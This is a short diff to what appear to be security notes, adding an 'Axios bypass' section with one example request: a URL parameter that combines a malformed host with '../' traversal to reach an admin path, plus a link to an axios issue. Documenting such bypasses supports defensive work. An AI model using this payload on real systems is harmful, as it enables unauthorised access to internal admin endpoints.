@@ -27,3 +27,10 @@ function isUserAdmin(user) {
     return false;
 }
 ```
+
+
+## Axios bypass
+
+http://localhost/?url=http:/mdisec.com:1337/../admin
+
+https://github.com/axios/axios/issues/6295
